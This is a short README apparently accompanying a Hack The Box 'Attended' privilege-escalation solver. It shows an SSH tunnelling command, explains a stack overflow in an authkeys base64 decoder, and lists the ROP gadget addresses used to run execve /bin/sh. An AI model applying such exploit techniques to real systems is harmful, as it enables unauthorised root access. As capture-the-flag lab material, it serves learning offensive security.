# HTB-Attended-Root-Solver-Script
HTB-Attended-Root-Script

1. Connect to attended
ssh -L 2222:attendedgw:2222 -i attended freshness@attended.htb
Keep this window open

2. Run attended_root_solver.py

ssh-keygen -t rsa -b 8192 to generate the keys.

I looked at /etc/ssh/sshd_config in attendedgw. It's running authkeys. 4th argument is our public key

I analyzed authkeys, the function at 4002C4 is a base64 decoder vulnerable to a stack overflow. Stack is not executable but no canary.

So I used a ROP chain that runs execve /bin/sh -c some_command

The gadgets are severely limited, so I am using only these:

0x0000000000400370: shr eax, 1; ret;
0x000000000040036d: not al; adc cl, 0xe8; ret;
0x000000000040036a: pop rdx; ret;
0x0000000000400368: mov edi, esi; pop rdx; ret;
0x000000000040037b: movss xmm0, dword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
0x0000000000400380: cvtss2si esi, xmm0; ret;
0x00000000004003cf: syscall; ret;
